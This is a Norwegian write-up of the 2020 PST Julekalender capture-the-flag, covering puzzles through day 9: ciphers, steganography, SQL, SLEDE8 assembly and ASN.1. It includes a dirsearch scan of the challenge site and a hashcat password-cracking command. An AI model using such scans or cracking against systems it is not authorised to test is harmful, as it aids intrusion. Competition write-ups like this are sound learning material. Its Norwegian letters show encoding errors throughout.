---
title: PST Julekalender CTF
author: pst.no 
instructor: https://github.com/tastefinger
type: CTF
link: npst.no
date: 2020-12-24
---
# Intro
For andre Ã¥ret pÃ¥ rad arrangerte [PST](https://pst.no/) en [CTF](https://en.wikipedia.org/wiki/Capture_the_flag) der man under tiden fra 1. til 24. desember 2020 skulle lÃ¸se ulike oppgaver pÃ¥ nett. Som Ã¥ret fÃ¸r, var temaet knyttet opp mot sikkerhetstjenester pÃ¥ Nordpolen og Sydpolen samt noen skumle pingviner som forsÃ¸kte Ã¥ gjÃ¸re livet surt for julenissen og hans reinsdyr. Heller obskurt tema, men ganske sÃ¥ underholdende. Hver dag fikk man en ny oppgave i form av en e-post fra brukeren `Mellomleder` i et eget e-post grensesnitt, `Snabel-A`, pÃ¥ nettstedet [dass.npst.no](https://dass.npst.no/). Svaret pÃ¥ oppgaven ville vÃ¦re et _flagg_ som ga 10 poeng.

> Poenggivende flagg er pÃ¥ formen `PST{.*}`, eksempelvis `PST{littTekstOgTall}`.

> Flagg leveres i `Snabel-A` som svar til `Mellomleder` pÃ¥ dagens oppgave.

Det kom ogsÃ¥ frem etterhvert at det fantes ekstraoppgaver i Ã¥rets kalender som lÃ¥ skjult litt rundt omkring som [easter eggs](https://en.wikipedia.org/wiki/Easter_egg_(media)). Ved Ã¥ finne disse eggene, fikk man en ekstra stjerne i margen pÃ¥ resultatlisten som ble kontinuerlig oppdatert. Med fasit i hÃ¥nd, var det totalt 11 egg gjemt litt her og der. Mer om de senere.

Det er veldig mange som er mye bedre enn meg pÃ¥ denne type CTF'er, men det er allikevel utrolig lÃ¦rerikt Ã¥ prÃ¸ve seg pÃ¥ de ulike oppgavene. Allikevel litt frustrerende iblant Ã¥ se at noen lÃ¸ste oppgaven pÃ¥ under 10 min, mens jeg selv brukte maaange timer. LÃ¦ringsutbyttet kan uansett ingen ta fra oss som deltok ğŸ˜Š Jeg kom til slutt i mÃ¥l med alle oppgavene, selv om luke 24 ble levert en dag for sent. Julaften var litt opptatt med andre ting...

Som Ã¥ret fÃ¸r, var det ogsÃ¥ dette Ã¥ret en aktiv [Discord-kanal](https://discord.gg/8kvF3aU) med veldig mange fine folk og mange gode (og ofte meget sÃ¦re) diskusjoner underveis. 

Store takk til mange, spesielt til `Darth Kevin`, `S Claus`, `wat`, `Pzzaroo` og `Tivec` for mer eller mindre Ã¥penbare hint til en n00b underveis. PST fortjener ogsÃ¥ en stor takk for et sÃ¦rdeles godt gjennomfÃ¸rt drama i 24 akter.
## Opptur
Ã…rets opptur var utvilsomt 13. desember da jeg en kort stund var pÃ¥ pallen pÃ¥ rankingen. Hvem skulle tro at en enkel gutt fra landet kunne komme sÃ¥ langt? LivsmÃ¥let var oppnÃ¥dd   

!["pallen, baby"](../pics/pst_scoreboard.png)
## Nedtur
Oppturer kommer sjelden alene, og oppstÃ¥r gjerne i par med en real nedtur. Ã…rets stÃ¸rste nedtur kom fredag 11. desember da jeg mistet meg selv en kort stund. Det kom en e-post fra HR som var som fÃ¸lger

> For de av dere som befinner dere her pÃ¥ Nordpolen vil vi minne om lÃ¸nningsglÃ¸gg i kveld J
> Grunnet den pÃ¥gÃ¥ende pandemien kan vi dessverre ikke Ã¥pne for tilreisende alvebetjenter pÃ¥ dagens arrangement.

I mine grublerier og naivitet tenkte jeg at her lÃ¥ det et egg begravet. Assosiasjonen gikk raskt til omrÃ¥det [Nordpolen i Oslo](https://no.wikipedia.org/wiki/Nordpolen_(Oslo)). Det mÃ¥tte jo ha en sammenheng!? SÃ¥ en sen fredagskveld etter at kroppen var fylt med taco, fant jeg ut at jeg burde lufte meg litt. Jeg forlot gullrekka, kone og barn og syklet avgÃ¥rde. Ut pÃ¥ ekspedisjon, Nordpolen neste! I min iver hadde jeg glemt det alle polfarere bÃ¸r passe pÃ¥, nemlig passende bekledning. Det var en vÃ¥t og kald polfarer som etterhvert smÃ¸g seg ubemerket inn pÃ¥ Nordpolen. Her gjaldt det Ã¥ ikke vekke oppmerksomhet for Ã¥ ikke skremme lÃ¸nningsglÃ¸ggen. Jeg var jo tross alt ikke velkommen.

Oslos Nordpolen er en plass med butikker, restauranter, trafikklys og juletresalg. Og selvsagt, Nordpolen kiosk. Det syntes ganske Ã¥penbart at dette var stedet for en god lÃ¸nningsglÃ¸gg og snikenede alvebetjenter. I tillegg var jeg kald og vÃ¥t, sÃ¥ jeg mÃ¥tte finne et sted med varme og kjÃ¦rlighet.

!["no egg"](../pics/pst_nordpolen.jpg)

Her var det bare Ã¥ bite tenna sammen og snike seg inn. Vel inne var det lite som tydet pÃ¥ julestemning og lÃ¸nningsglÃ¸gg, men det var nok av mistenkelige typer der. Jeg snoket rundt til de mistenkelige typene sluttet Ã¥ snakke sammen og i sine stille sinn sikkert tenkte at denne karen burde vi kvitte oss med fÃ¸r nissen kommer. Jeg er en fintfÃ¸lende person, sÃ¥ jeg enset ganske raskt den endrede stemningen i lokalet og fant ut at jeg burde opptre sÃ¥ normalt som mulig. Det mest naturlige jeg kom pÃ¥ var Ã¥ spÃ¸rre om de hadde noen egg? Det ble om mulig enda mer stille i kiosken og uroligheten steg nok et hakk hos de mistenkelige typene. Eller de sydpolare agentene, som jeg nÃ¥ kalte dem i mitt ikke sÃ¥ veldig stille sinn. Kiosken innehaver (som hadde en nese som sÃ¥ litt ut som et pingvinnebb) kunne nÃ¸lende fortelle at nei, egg hadde de nok ikke. Men skulle det kanskje vÃ¦re noe annet fÃ¸r jeg gikk. Med trykk pÃ¥ _gikk_. Jeg skjÃ¸nte at jeg var pÃ¥ sporet av noe, men skjÃ¸nte ogsÃ¥ at det var lurest Ã¥ komme seg ut. Keiserpingvinen hadde jo gitt et kraftig hint om at jeg burde komme meg ut, sÃ¥ jeg grabbet til meg en eske IFA, betalte og gikk ut. 

Om man kan hÃ¸re lettelsens sukk, sÃ¥ var det den lyden jeg hÃ¸rte bak meg da jeg gikk ut av fiendens pingvinhule. Jeg hadde unnsluppet, med en pakke IFA som nok hadde ligget der noen Ã¥r siden inneholdet smakte mer som stein (og dette vet jeg en del om siden jeg spiste en del stein i min barndom). Det var helt tydelig at kiosken var et skalkeskjul for hemmelige operasjoner, for omsetning pÃ¥ IFA-pastiller hadde de ikke.

Men sÃ¥ sÃ¥ jeg det! Rett foran meg var egget! Hoho, at jeg ikke hadde sett det fÃ¸r, men spillet var nok sÃ¥nn at jeg _fÃ¸rst_ mÃ¥tte innom kiosken for deretter Ã¥ komme ut i rett vinkel i forhold til plassen og se rett pÃ¥ egget! For et vakkert egg!

!["no egg"](../pics/pst_no_egg.jpg)

Men koden, man trenger en kode, hvor var den? Den var heldigvis ikke langt unna, pÃ¥ stolpen rett bak egget.

!["no kode"](../pics/pst_no_egg_code.jpg)

Oh lykke! Jeg hadde funnet egget! Jeg var kald, vÃ¥t og hadde munnen full av steinharde IFA-pastiller, men ingenting spilte noen rolle lenger. Her ventet Ã¦re, berÃ¸mmelse og en stor, feit stjerne i margen. Med hjertet pÃ¥ vei opp i halsen og en stein pÃ¥ kollisjonskurs ned samme vei, fikk jeg sendt avgÃ¥rde **EGG{249825}** til HR. Svaret kom raskt

!["no lykke"](../pics/pst_11_feil_flagg.png)

Whaat!? Det mÃ¥tte vÃ¦re noe feil? Hadde jeg bommet pÃ¥ tallene? Desperat forsÃ¸kte jeg alle permutasjoner av 249825, men med samme nedslÃ¥ende svar fra HR. Jeg mÃ¥tte slukÃ¸ret innrÃ¸mme at jeg hadde tatt feil. 

Som den snikende alvebetjenten jeg nÃ¥ var, snek jeg meg hjem igjen og latet som ingenting. Akkurat den strategien var vellykket og jeg gled helt ubemerket inn i familielykken igjen og sa noen velvalgte ord om at Alex RosÃ©n var veldig flink til Ã¥ synge i Stjernekamp. For andre gang pÃ¥ en times tid sluttet mistenkelige typer Ã¥ snakke rundt meg og jeg gikk og la meg og grÃ¥t meg i sÃ¸vn.

# Innholdsfortegnelse

| Luker | |
| --- | --- |
| [1 - CÃ¦sarchiffer](#1---cÃ¦sarchiffer) | [2 - Lydfil](#2---lydfil) |
| [3 - Steganografi](#3---steganografi) | [4 - SQL](#4---sql) |
| [5 - CSV og UTF-16](#5---csv-og-utf-16) | [6 - SLEDE8, intro](#6---slede8-intro) |
| [7 - EBCDIC](#7---ebcdic) | [8 - ASN.1, del 1](#8---asn1-del-1) |
| [9 - Emojis](#9---emojis) | [10 - SLEDE8, hex til ASCII](#10---slede8-hex-til-ascii) |
| [11 - SQLite og WAL-filer](#11---sqlite-og-wal-filer) | [12 - SLEDE8, reversing](#12---slede8-reversing) |
| [13 - ASCII-art](#13---ascii-art) | [14 - SLEDE8, rekkefÃ¸lge](#14---slede8-rekkefÃ¸lge) |
| [15 - Manchester code](#15---manchester-code) | [16 - SLEDE8, sortering](#16---slede8-sortering) |
| [17 - ASN.1, del 2](#17---asn1-del-2) | [18 - SLEDE8, buffer overflow](#18---slede8-buffer-overflow) |
| [19 - Shami's Secret Sharing](#19---shamis-secret-sharing) | [20 - pcap](#20---pcap) |
| [21 - Rule 30](#21---rule-30) | [22 - Side-channel attack](#22---side-channel-attack) |
| [23 - QR-koder](#23---qr-koder) | [24 - Sledesimulator](#24---sledesimulator) |
| [Hilsen fra Julenissen](#hilsen-fra-julenissen) | |

# 1 - CÃ¦sarchiffer
> Kan du bekrefte at du har fÃ¥tt tilgang til systemet? Det gjÃ¸r du ved Ã¥ svare pÃ¥ denne meldingen med verifiseringskoden RUV{JgkJqPÃ¥GtFgvLwnKilgp}.
> OBS: Jeg mistet verifiseringskoden din i salaten, sÃ¥ mulig du mÃ¥ rette opp i den fÃ¸r du svarer.

Ã…rets fÃ¸rste luke var en relativt enkel [CÃ¦sarchiffer](https://no.wikipedia.org/wiki/C%C3%A6sarchiffer). Denne kunne man [skifte 24 steg][1] for Ã¥ finne lÃ¸sningen. 

**LÃ¸sning: PST{HeiHoNÃ¥ErDetJulIgjen}**

## Kokt egg
Det viste seg at det var skjult et egg i en fil pÃ¥ dass.npst.no. Men hvilken fil? Jeg fikk et tips om at [dirsearch](https://github.com/maurosoria/dirsearch) var et godt verktÃ¸y (kommandolinjevarianten av [DirBuster](https://tools.kali.org/web-applications/dirbuster)?).

```bash
$ python3 dirsearch.py -u https://dass.npst.no
[14:16:34] Starting:
[14:17:40] 200 -   15KB - /favicon.ico
[14:17:44] 200 -    1KB - /humans.txt
[14:17:45] 200 -    1KB - /index.html
[14:18:07] 200 -   51B  - /robots.txt

Task Completed

$ curl https://dass.npst.no/humans.txt 
EGG{sh4rks_d0t_txt}
```

Ã…pner man https://dass.npst.no/humans.txt i en nettleser, dukker ikke egget umiddelbart opp. Det er nemlig skjult laaaangt nede pÃ¥ siden og man mÃ¥ skrolle kraftig ned for Ã¥ finne det.  SÃ¥ledes er `curl` et bedre alternativ.

**Utmerkelse #1: EGG{sh4rks_d0t_txt}**

# 2 - Lydfil
> Etteretningsoffiseren GWYN, Pen ble stoppet i tollen ved utreise den 25. november. Vi sikret i den forbindelse et lagringsmidie som inneholdt en mystisk fil. Kan du analysere filen pen_gwyn_greatest_hits.mid?
> Det er fortsatt uvisst hvorfor GWYN befant seg pÃ¥ Nordpolen pÃ¥ dette tidspunktet, men han skal ha blitt observert pÃ¥ det lokale vannhullet Svalbar.

Oppgaven kom med en fil, `beslag.zip`

```bash
$ unzip beslag.zip
Archive:  beslag.zip
  inflating: pen_gwyn_greatest_hits.mid
  inflating: privat.7z
```

Dette var tydeligvis en [lydfil](https://en.wikipedia.org/wiki/MIDI). En kjapp hexdump av fila ga lÃ¸sningen

```bash
$ xxd -c 10 pen_gwyn_greatest_hits.mid | cut -c 45 | tail -59 | head -34
P
S
T
{
B
a
b
y
P
e
n
G
w
y
n
D
u
h
D
u
h
D
u
h
D
u
h
D
u
h
D
u
h
}
```

**LÃ¸sning: PST{BabyPenGwynDuhDuhDuhDuhDuhDuh}**

Det var en fil til der ogsÃ¥, `privat.7z`, men den lot seg ikke Ã¥pne uten passord. Man kunne uansett se innholdet i den

```bash
$ 7z l privat.7z

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-11-30 12:48:43 .....       337740       338448  cupcake.png
2020-11-30 12:51:29 .....          682               kladd.txt
------------------- ----- ------------ ------------  ------------------------
```

# 3 - Steganografi
> Din kollega Tastefinger har identifisert noe ğŸ§ med fila cupcake.png fra beslaget du arbeidet med i gÃ¥r. Det er SANNSYNLIG at det kan vÃ¦re informasjon i bildet som ikke er synlig med det blotte Ã¸ye. Gleder meg til Ã¥ hÃ¸re hva du kommer frem til!      


og   


> Hvis forrige melding var noe uklar sÃ¥ er altsÃ¥ passordet `til zip-fila,`.


SÃ¥ passordet var `til zip-fila,`. Lot seg Ã¥pne med `7z x privat.7z`.

!["cupcake"](../pics/pst_cupcake.png)

Lastet opp cupcake.png til https://stylesuxx.github.io/steganography/, som ga hidden message: [youtu.be/I_8ZH1Ggjk0](http://youtu.be/I_8ZH1Ggjk0). Kunne ogsÃ¥ tatt `zsteg cupcake.png` for Ã¥ finne samme melding. YouTube-filmen viste en scene fra [CSI](https://en.wikipedia.org/wiki/CSI:_Crime_Scene_Investigation) der man kan _enhance_ et bilde. dass.npst.no hadde et menyvalg som het `Forbedre...`. Der kunne man laste opp bildet og "forbedre" det. Etter Ã¥ ha forbedret bildet et antall ganger, kunne man se svaret pÃ¥ den gule lappen i bakgrunnen

!["lappen"](../pics/pst_9bab0c0ce96dd35b67aea468624852fb.png)

**LÃ¸sning: PST{HuskMeteren}**

## EggerÃ¸re
`kladd.txt`  fra den fÃ¸r nevnte zip-fila hadde fÃ¸lgende innhold
```
ğŸ›·ğŸ›·ğŸ›·ğŸ›·ğŸ›·ğŸ›·ğŸ›·ğŸ›· N4Igzg9grgTgxgUwMIQCYJALhAZQKIAqBABDAIwA0xADAB5kA6AdgGo4DSAkgGInlXlm+IqWpUAbAE4h7AEqcWo5gAkA8gAV1NWgCYEzZgAsAtsczMAdABEAggRvaALI4p1xAVle0ECLwA4Adi8AI3F-MTpUSjpHXzoAQy9HRMiAMy9JVMtbe214iNp3VC8AnS94sro-AGYMuNpJTzoEJtpUAtQwhJSGnWy7BzoA+tS4ENq6auCQ9Lp3aO9phPqEYqrK+jG6HUcDJnUAGQBVHBxRAUYmDnlFGGoZG6Urwj4xbQDgh4UngiPZYjAAE9UAAHCAAGwQTGYhxOZzuFy+t3u0KuBA06j2QNBEKh5meInILiewj4ZE8pEuzG4nAAcrTiCZjMwABp4A4HPD-GBlUh9Al8Cl0KlMCDGADWADdVvjOfDqswDjYcHxdkw2RyuaRaqQ1YrOOw+QIFUwAEJqTTEMFgAAu4KgqAAllBmVc5N8YCbYadzqR3CoMcQxVLVntrXaHc6zEIXr6iTHCZRKf6mLJCH89swQBQQI6mCCoDasCAyKVJPFgnBqqkpn5JI5quJxMEdAF4qka3B5sEyKh2u1EHBm2RJJJgn50KkAtQ4JIdKgdO5hhUdH4fGQaj4PDsQABfIA
```
Innholdet ga mening fÃ¸rst etter luke 6 da man hadde fÃ¥tt en introduksjon til Slede8. Deretter var det bare Ã¥ lime inn innholdet i URL'en: [https://https://slede8.npst.no/#N4Igzg9grg...](https://slede8.npst.no/#N4Igzg9grgTgxgUwMIQCYJALhAZQKIAqBABDAIwA0xADAB5kA6AdgGo4DSAkgGInlXlm+IqWpUAbAE4h7AEqcWo5gAkA8gAV1NWgCYEzZgAsAtsczMAdABEAggRvaALI4p1xAVle0ECLwA4Adi8AI3F-MTpUSjpHXzoAQy9HRMiAMy9JVMtbe214iNp3VC8AnS94sro-AGYMuNpJTzoEJtpUAtQwhJSGnWy7BzoA+tS4ENq6auCQ9Lp3aO9phPqEYqrK+jG6HUcDJnUAGQBVHBxRAUYmDnlFGGoZG6Urwj4xbQDgh4UngiPZYjAAE9UAAHCAAGwQTGYhxOZzuFy+t3u0KuBA06j2QNBEKh5meInILiewj4ZE8pEuzG4nAAcrTiCZjMwABp4A4HPD-GBlUh9Al8Cl0KlMCDGADWADdVvjOfDqswDjYcHxdkw2RyuaRaqQ1YrOOw+QIFUwAEJqTTEMFgAAu4KgqAAllBmVc5N8YCbYadzqR3CoMcQxVLVntrXaHc6zEIXr6iTHCZRKf6mLJCH89swQBQQI6mCCoDasCAyKVJPFgnBqqkpn5JI5quJxMEdAF4qka3B5sEyKh2u1EHBm2RJJJgn50KkAtQ4JIdKgdO5hhUdH4fGQaj4PDsQABfIA)

NÃ¥r man kjÃ¸rte programmet, ble egget gulpet opp.  

**Utmerkelse #2: EGG{SLEDE8ExampleForSPSTInternalUseOnly}**

## Eggkapsler

Dag 3 hadde ogsÃ¥ et helt eget easteregg. Det kunne man finne i det siste bildet av lappen som ga svar pÃ¥ den opprinnelige oppgaven.

```bash
zsteg 9bab0c0ce96dd35b67aea468624852fb.png
b1,rgb,lsb,xy       .. text: "EGG{MeasureOnceCutTwice}"
```
**Utmerkelse #3: EGG{MeasureOnceCutTwice}**

# 4 - SQL
> Som alle vet, sÃ¥ varer jula helt til pÃ¥ske, og her starter problemene...
> Vi i mellomledergruppa har begynt pÃ¥ et forprosjekt for utredning av bemanningsstrategi for pÃ¥sken i Ã¥rene fremover. Systemet vi benytter for Ã¥ finne ut nÃ¥r det er pÃ¥ske oppfÃ¸rer seg rart, slik at dette viktige arbeidet nÃ¥ har blitt satt pÃ¥ vent. Klarer du Ã¥ finne ut hva som er feil?
> Vi i mellomledergruppa er svÃ¦rt interessert i mÃ¥ltall, og ledelsen Ã¸nsker en rapport snarest pÃ¥ summen av kolonnen Maaltall fra og med 2020 til og med 2040. Kan du svare meg med denne summen, omkranset av PST{ og } nÃ¥r du finner ut av det?

Den gitte fila `DatoPaaske.csv` inneholdt tilsynelatende de riktige data, men om man kikket nÃ¦rmere etter, var det en del duplikater og noen som manglet. Hver rad representerte pÃ¥skeaften for et gitt Ã¥r. Noen Ã¥r var duplikater (2020, 2026...) og noen Ã¥r manglet (2023, 2028, 2034, 2040). Det viste seg Ã¥ vÃ¦re feil i funksjonen ProcedureDatoPaaske, som regnet Ã¥r feil. Endte opp med Ã¥ kjÃ¸re opp [MSSQL i Docker](https://hub.docker.com/_/microsoft-mssql-server).

```bash
cat DatoPaaske.csv
DatoPaaskeId;PaaskeAften;PaaskeFerieUke;Aar;MaalTall
1;2020-04-11;15;2020;43930
2;2020-04-11;15;2020;43930
3;2021-04-03;13;2021;44287
 # fix the wrong function
sed -i '' 's/YEAR(DATEADD(day, 26 - DATEPART(isoww, @foerste_jan), @foerste_jan));/YEAR(@foerste_jan);/g' dbo.ProcedureDatoPaaske.sql
 # run MSSQL via Docker
docker run --name npstdb -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=strong(!)Password' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2017-latest
 # copy sql files to Docker-container
for f in *.sql; do docker cp $f npstdb:/; done;
 # start bash in container
docker exec -it npstdb /bin/bash
 # execute sql scripts to setup database
/opt/mssql-tools/bin/sqlcmd -i dbo.DatoPaaske.sql -i dbo.FunctionPaaskeAften.sql -i dbo.ProcedureDatoPaaske.sql -S localhost -U sa -P 'strong(!)Password'
 # modify GenererRapport to also sum the correct column
echo -e "USE [NPSTDB]\nGO\n$(cat GenererRapport.sql)\nselect sum(MaalTall) from DatoPaaske\nGO\n" > rapport_med_rett_db.sql
 # run sql to get flag
/opt/mssql-tools/bin/sqlcmd -i rapport_med_rett_db.sql -S localhost -U sa -P 'strong(!)Password'
```
Alternativ, manuell lÃ¸sning. Legg til de fire tallene i kolonnen fra `DatoPaaske.csv` og slett duplikater. Summere tallene.
```
select CONVERT (INT, cast('2023-04-08' AS DATETIME)) => 45022
select CONVERT (INT, cast('2028-04-15' AS DATETIME)) => 46856
select CONVERT (INT, cast('2034-04-08' AS DATETIME)) => 49040
select CONVERT (INT, cast('2040-03-31' AS DATETIME)) => 51224
```

**LÃ¸sning: PST{999159}**

# 5 - CSV og UTF-16
> Det rapporteres om tilgangstrÃ¸bbel til dokumentasjonsvelvet. Vi har fÃ¥tt logger fra Seksjon for passord og forebygging i perioden der man mistenker at feilen kan ligge. Finner dere noe ğŸ§ i loggene?

Den vedlagte fila, `log.csv`, var [UTF-16](https://en.wikipedia.org/wiki/UTF-16)-encoded, sÃ¥ lot seg ikke sÃ¸ke med f.eks. `grep Pen log.csv` siden alle bokstaver hadde hex `00` bak seg. Det kunne man se mha. xxd. Men `grep -ai p.e.n log.csv` lot seg kjÃ¸re, uten at det nÃ¸dvendigvis ga noe mer. SÃ¥ var fila URL-encoded ogsÃ¥. Tok den inn i CyberChef og kjÃ¸rte to ting: [decode text fra UTF-16 LE og URL Decode][5]

Lastet ned innholdet fra CyberChef og Ã¥pnet det i Excel og filtrerte pÃ¥ avsender. Der var det noen som pekte seg ut: `Mellomleder`, `Tastefinger`, `Nissen`, `Systemeier` og `Niâ€šÃ„Ã£ssen`. Den siste hadde bare en melding: `I dag har jeg lyst til at PST{879502f267ce7b9913c1d1cf0acaf045} skal vâˆšÂ¶re passordet mitt`. Det var ogsÃ¥ flagget

**LÃ¸sning: PST{879502f267ce7b9913c1d1cf0acaf045}**

Dette virket vÃ¦re et [MD5](https://en.wikipedia.org/wiki/MD5)-hashet passord. Jeg valgte den siste MD5-summen til hver av de fem nevnte brukerne og prÃ¸vde [hashcat](https://hashcat.net/hashcat/) for Ã¥ finne selve passordet. Det ga dog ingen suksess  
`hashcat -m 0 -O -r OneRuleToRuleThemAll.rule passwords_md5.txt passordfil.txt`


## Speilegg
**Utmerkelse #4**: det kom en e-post som sa `send en melding til HR med teksten EGG{w0rlds_b3st_b0ss}`. Som sagt sÃ¥ gjort, takk for et gratis egg.

# 6 - SLEDE8, intro
> Det er pÃ¥ tide at dere begynner med e-lÃ¦ringen i SLEDE-8. Dette er arvtageren til SLEDE-4, og benyttes flittig av vÃ¥re utviklere.
> Fint hvis du rapporterer tilbake med verifikasjonskoden nÃ¥r du har lÃ¸st e-lÃ¦ringsmodulen med kode 4032996b1bbb67f6. UtviklerverktÃ¸yet finner du [her](https://slede8.npst.no/).

Her skulle man friske opp Assembly-kunnskapene med hjelp av noen e-lÃ¦ringsmoduler fÃ¸r man ga seg pÃ¥ den faktiske oppgaven. Systemet var godt beskrevet pÃ¥ https://github.com/PSTNorge/slede8. Verdt Ã¥ merke seg er at koden tar `fÃ¸de` som input og produserer `oppgulp` som output.

e-lÃ¦ring Enkel addisjon
```
; Les to tall fra fÃ¸de og beregn summen
; Skriv sÃ¥ ut summen
LES r0
LES r1
PLUSS r0,r1
SKRIV r0
STOPP
``` 

selve oppgaven
```
; FÃ¸de: 0401020304
; FÃ¸rste byte med fÃ¸de er et tall N som representerer
; antallet pÃ¥fÃ¸lgende bytes med fÃ¸de.
; Beregn summen av de N pÃ¥fÃ¸lgende tallene,
; og gi resultatet som oppgulp.

; Lykke til!
LES r0; antall pÃ¥fÃ¸lgende tall
SETT r2,0; teller
SETT r3,1; konstant
SETT r4,0; resultat

les:
LES r1; leser fra fÃ¸de         
PLUSS r4,r1; r4=r4+r1
PLUSS r2,r3; r2=r2+1
ULIK r0,r2; if(r0!=r2) then
BHOPP les; else 
SKRIV r4; skriv ut resultat
STOPP 
```

NÃ¥r oppgaven ble sendt inn via det gitte grensesnittet, ble man belÃ¸nnet med flagget.

**LÃ¸sning : PST{ATastyByteOfSled}**

## Knuste egg
Man mÃ¥tte gjennomfÃ¸re e-lÃ¦ringsmodulen `Hello World!` for Ã¥ fÃ¥ dagens egg. Her er et eksempel pÃ¥ en hardkodet variant som skriver ut `48656c6c6f2c20576f726c64210a` (`Hello, World!\n` i hex).
```
; Skriv ut strengen "Hello, World!\n"

; Tips: 
; - Du kan velge om oppgulp skal vise ASCII- eller hex-verdier
; - Det enkle er ofte det beste
; Lykke til!
SETT r0, 0x48
SKRIV r0
SETT r0, 0x65
SKRIV r0
SETT r0, 0x6c
SKRIV r0
SETT r0, 0x6c
SKRIV r0
SETT r0, 0x6f
SKRIV r0
SETT r0, 0x2c
SKRIV r0
SETT r0, 0x20
SKRIV r0
SETT r0, 0x57
SKRIV r0
SETT r0, 0x6f
SKRIV r0
SETT r0, 0x72
SKRIV r0
SETT r0, 0x6c
SKRIV r0
SETT r0, 0x64
SKRIV r0
SETT r0, 0x21
SKRIV r0
SETT r0, 0x0a
SKRIV r0
STOPP  
```

**Utmerkelse #5: EGG{Hello, SLEDE8!}**

# 7 - EBCDIC
> Det har blitt fanget opp et rart signal her pÃ¥ julenissens verksted. Det ser ikke ut til at det er et kontinuerlig signal, da det ser til Ã¥ komme og gÃ¥ litt. Klarer du Ã¥ finne ut hva det er?

Utdelt var en fil, `data.complex16u`, som hadde [EBCDIC](https://en.wikipedia.org/wiki/EBCDIC)-data i seg. 
```bash
file data.complex16u
data.complex16u: International EBCDIC text, with very long lines, with no line terminators
```

Skrev en liten python-snutt, som egentlig bare ga samme ut som inn
```python
import codecs
import ebcdic

with codecs.open("data.complex16u", 'rb') as input_file:
    print(input_file.read().decode('cp500'))
```

Googling etter `complex16u` fÃ¸rte meg til https://github.com/jopohl/urh. Jeg installerte URH (Universal Radio Hacker) og Ã¥pnet fila der. Det ga umiddelbart flagget om man valgte "Show Signal as ASCII". URH er visst "a complete suite for wireless protocol investigation with native support for many common Software Defined Radios". SÃ¥ her er vi inne pÃ¥ [SDR](https://en.wikipedia.org/wiki/Software-defined_radio).

**LÃ¸sning: PST{0n_0ff_k3y1ng_1s_34sy!}**

# 8 - ASN.1, del 1
> Det er viktig med faglig utvikling, ogsÃ¥ nÃ¥ i fÃ¸rjulsstria. Dagens tema er ASN.1. Her er litt hjernetrim fra Nissens Kompetansebankâ„¢.

```
MIIBOTCCATAwggEnMIIBHjCCARUwggEMMIIBAzCB+zCB8zCB6zCB4zCB2zCB0zCByzCBwzCBuzCBszCBqzCBozCBnDCBlDCBjDCBhDB9MHYwbzBoMGEwWjBTMEwwRTA+MDcwMTAqMCMwHDAVMA4wBwUAoQMCAROgAwIBA6EDAgEMogMCAQChAwIBE6ADAgEBoQMCARKkAgUAoQMCARShAwIBDqIDAgEYoQMCAQShAwIBEqEDAgEOoQMCAQ6hAwIBB6IDAgECogMCAQigAwIBAaIDAgENogMCARKiAwIBAKMCBQCiAwIBE6IDAgESogMCAQ+hAwIBEaEDAgEOoQMCAQugAwIBAKIDAgEDoQMCAQyhAwIBFKEDAgESoQMCAQ+gAwIBAaEDAgEMoAMCAQOhAwIBEaEDAgEOogMCAQs=

Spec DEFINITIONS ::= BEGIN
    LinkedList ::= Node
    Node ::= SEQUENCE {
        child CHOICE {
            node Node,
            end NULL
        },
        value CHOICE {
            digit                [0] INTEGER(0..9),
            lowercase           [1] INTEGER(1..26),
            uppercase           [2] INTEGER(1..26),
            leftCurlyBracket    [3] NULL,
            rightCurlyBracket   [4] NULL
        }
    }
END
```

[ASN.1](https://en.wikipedia.org/wiki/ASN.1) er et standardisert, formelt sprÃ¥k. Det brukes for Ã¥ representere data pÃ¥ en implementasjonsuavhengig mÃ¥te (i fÃ¸lge Wikipedia). De online-ressursene jeg fant, f.eks. https://asn1.io/asn1playground/, hÃ¥ndterte ikke koden. Endte til slutt opp med en Python-lÃ¸sning

```python
import base64
import asn1tools

SPECIFICATION = '''
Spec DEFINITIONS ::= BEGIN
    LinkedList ::= Node
    Node ::= SEQUENCE {
        child CHOICE {
            node Node,
            end NULL
        },
        value CHOICE {
            digit                [0] INTEGER(0..9),
            lowercase           [1] INTEGER(0..25),
            uppercase           [2] INTEGER(0..25),
            leftCurlyBracket    [3] NULL,
            rightCurlyBracket   [4] NULL
        }
    }
END'''

npst = asn1tools.compile_string(SPECIFICATION, 'der')
decoded_bytes = base64.b64decode('MIIBOTCCATAwggEnMIIBHjCCARUwggEMMIIBAzCB+zCB8zCB6zCB4zCB2zCB0zCByzCBwzCBuzCBszCBqzCBozCBnDCBlDCBjDCBhDB9MHYwbzBoMGEwWjBTMEwwRTA+MDcwMTAqMCMwHDAVMA4wBwUAoQMCAROgAwIBA6EDAgEMogMCAQChAwIBE6ADAgEBoQMCARKkAgUAoQMCARShAwIBDqIDAgEYoQMCAQShAwIBEqEDAgEOoQMCAQ6hAwIBB6IDAgECogMCAQigAwIBAaIDAgENogMCARKiAwIBAKMCBQCiAwIBE6IDAgESogMCAQ+hAwIBEaEDAgEOoQMCAQugAwIBAKIDAgEDoQMCAQyhAwIBFKEDAgESoQMCAQ+gAwIBAaEDAgEMoAMCAQOhAwIBEaEDAgEOogMCAQs=')
decoded = npst.decode('Node', decoded_bytes)


def recurse(obj, text):
    value_type = obj['value'][0]
    value = obj['value'][1]
    if value_type == 'lowercase':
        text = text + chr(value + 97)
    elif value_type == 'uppercase':
        text = text + chr(value + 97).upper()
    elif value_type == 'digit':
        text = text + str(value)
    elif value_type == 'leftCurlyBracket':
        text = text + '{'
    elif value_type == 'rightCurlyBracket':
        text = text + '}'
    if obj['child'][1]:
        return recurse(obj['child'][1], text)
    return text


print(recurse(decoded, ''))
```

**LÃ¸sning: PST{ASN1IChooseYou}**

# 9 - Emojis
> En samarbeidende tjeneste har sendt oss en chatlogg fra en antatt SPST agent. Meldingen vekket oppsikt pga den overdrevne bruken av emojier. Meldingen ser ut til Ã¥ vÃ¦re obfuskert pÃ¥ en eller annen mÃ¥te som ikke er kjent for oss fra tidligere beslag.
> Vi lurer pÃ¥ om det kan vÃ¦re brukt HEXMAS-enkoding. Kan du undersÃ¸ke det nÃ¦rmere?

ğŸ…ğŸ¤¶â„â›„ğŸ„ğŸğŸ•¯ğŸŒŸâœ¨ğŸ”¥ğŸ¥£ğŸ¶ğŸ†ğŸ‘¼ğŸ¦ŒğŸ›·

